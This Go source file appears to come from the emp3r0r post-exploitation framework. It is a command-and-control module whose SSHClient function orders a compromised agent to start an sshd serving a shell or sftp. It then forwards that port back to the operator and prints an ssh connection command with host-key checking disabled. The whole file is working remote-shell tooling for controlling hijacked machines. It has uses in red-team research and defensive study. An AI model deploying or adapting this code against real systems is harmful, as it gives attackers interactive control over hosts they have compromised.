package modules

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

type SSH_SHELL_Mapping struct {
	Shell   string                  // the shell to run, eg. bash, python
	Agent   *def.Emp3r0rAgent       // the agent this shell is connected to
	PortFwd *network.PortFwdSession // the port mapping for this shell session
	ToPort  string                  // the port to connect to on the agent side, always the same as PortFwd.To's port
}

// shell - port mapping
// one port for one shell
var SSHShellPort sync.Map

// SSHClient ssh to sshd server, returns the SSH connection command string
// shell: the executable to run, eg. bash, python
// port: serve this shell on agent side 127.0.0.1:port
// Returns: (connectionString, error)
func SSHClient(shell, args, port string) (string, error) {
	target := agents.MustGetActiveAgent()
	if target == nil {
		return "", errors.New("no active agent")
	}
	// check if sftp is requested
	is_sftp := shell == "sftp"
	ssh_prog := "ssh"
	if is_sftp {
		ssh_prog = "sftp"
		shell = "sftp"
	}

	// SSHDShellPort is reserved
	is_new_port_needed := (port == live.RuntimeConfig.SSHDShellPort && shell != "sftp")
	// check if port mapping is already open, if yes, use it
	SSHShellPort.Range(func(key, value any) bool {
		s := key.(string)
		mapping := value.(*SSH_SHELL_Mapping)
		if s == shell && mapping.Agent == target {
			port = mapping.ToPort
			is_new_port_needed = false
			return false // stop iteration
		}
		return true
	})

	if !util.IsCommandExist("ssh") {
		return "", fmt.Errorf("ssh must be installed")
	}

	// check if we need a new (SSH) port (on the agent side, for new shell)
	lport := strconv.Itoa(util.RandInt(2048, 65535)) // shell gets mapped here
	new_port := strconv.Itoa(util.RandInt(2048, 65535))
	if is_new_port_needed {
		port = new_port // reset port

		// if sftp is requested, we are not using `interactive_shell` module
		// so no options to set
		if !is_sftp {
			live.SetOption("port", new_port)
		}
		logging.Warningf("Switching to a new port %s for shell (%s)", port, shell)
	}
	to := "127.0.0.1:" + port // decide what port/shell to connect to

	// is port mapping already done?
	port_mapping_exists := false
	network.PortFwds.Range(func(id, value any) bool {
		p := value.(*network.PortFwdSession)
		if p.Agent == target && p.To == to {
			port_mapping_exists = true
			SSHShellPort.Range(func(key, value any) bool {
				s := key.(string)
				ssh_mapping := value.(*SSH_SHELL_Mapping)
				// one port for one shell
				// if trying to open a different shell on the same port, change to a new port
				if s != shell && ssh_mapping.ToPort == port {
					lport = "" // mark for recursion
					return false
				}
				return true
			})
			// if a shell is already open, use it
			logging.Warningf("Using existing port mapping %s -> remote:%s for shell %s", p.Lport, port, shell)
			lport = p.Lport // use the correct port
			return false    // stop iteration
		}
		return true
	})

	if port_mapping_exists && lport == "" {
		new_port := strconv.Itoa(util.RandInt(2048, 65535))
		logging.Warningf("Port collision or conflict, restarting with a different port %s", new_port)
		live.SetOption("port", new_port)
		return SSHClient(shell, args, new_port)
	}

	var pf *network.PortFwdSession
	if !port_mapping_exists {
		// start sshd on agent
		job_id := uuid.NewString()
		ssh_args := fmt.Sprintf("--shell %s --port %s", strconv.Quote(shell), strconv.Quote(port))
		if args != "" {
			ssh_args += fmt.Sprintf(" --args %s", strconv.Quote(args))
		}
		cmd := fmt.Sprintf("%s %s", def.C2CmdSSHD, ssh_args)
		logging.Debugf("SSHClient logic: starting sshd on agent: %s", cmd)
		err := CmdSender(cmd, job_id, target.Tag)
		if err != nil {
			return "", err
		}
		logging.Infof("Waiting for sshd (%s) on target %s", shell, strconv.Quote(target.Tag))

		is_response := false
		res := ""
		// wait for response
		ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
		defer cancel()
		for range 100 {
			time.Sleep(100 * time.Millisecond)
			if ctx.Err() != nil {
				return "", fmt.Errorf("didn't get response from agent (%s), aborting", target.Tag)
			}

			if val, ok := live.CmdResults.Load(job_id); ok {
				safeRes := util.SanitizeText(val.(string))
				logging.Successf("SSHClient: %s", safeRes)
				res = safeRes
				is_response = true
				live.CmdResults.Delete(job_id)
				break
			}
		}
		if is_response {
			if strings.Contains(res, "success") ||
				strings.Contains(res, fmt.Sprintf("listen tcp 127.0.0.1:%s: bind: address already in use", port)) {
				// success
			} else {
				return "", fmt.Errorf("start sshd (%s) failed: %s", shell, res)
			}
		} else {
			return "", fmt.Errorf("didn't get response from agent (%s), aborting", target.Tag)
		}

		// set up port mapping for the ssh session
		logging.Infof("Setting up port mapping (local %s -> remote %s) for sshd (%s)", lport, to, shell)
		pf = &network.PortFwdSession{}
		pf.Description = fmt.Sprintf("ssh shell (%s)", shell)
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = lport, to
		pf.SendCmdFunc = CmdSender
		pf.RegisterFunc = RegisterPortFwdFunc
		pf.ShReady = make(chan struct{})
		pf.RegistrationDone = make(chan struct{})
		go func() {
			// remember the port mapping and shell and agent
			SSHShellPort.Store(shell, &SSH_SHELL_Mapping{
				Shell:   shell,
				Agent:   target,
				PortFwd: pf,
				ToPort:  port,
			})
			err = pf.RunPortFwd()
			if err != nil {
				logging.Errorf("Start port mapping for sshd (%s): %v", shell, err)
			}
		}()
		logging.Infof("Waiting for response from %s", target.Tag)
		if err != nil {
			return "", err
		}
	}

	// Wait until the port mapping is registered (RegistrationDone is closed by RunPortFwd).
	if !port_mapping_exists {
		select {
		case <-pf.RegistrationDone:
			port_mapping_exists = true
		case <-time.After(5 * time.Second):
			// fall through, port_mapping_exists remains false
		}
	}
	if !port_mapping_exists {
		return "", errors.New("port mapping unsuccessful")
	}

	// Build the SSH command string
	sshPath, err := exec.LookPath(ssh_prog)
	if err != nil {
		return "", fmt.Errorf("%s not found, please install it first: %v", ssh_prog, err)
	}
	sshCmd := fmt.Sprintf("%s -p %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no %s",
		sshPath, lport, def.Localhost)
	if is_sftp {
		sshCmd = fmt.Sprintf("%s -P %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no %s",
			sshPath, lport, def.Localhost)
	}

	logging.Infof("\nSSH (%s - %s) session ready for %s.\nConnection command:\n%s",
		shell, port, target.Tag, sshCmd)

	return sshCmd, nil
}
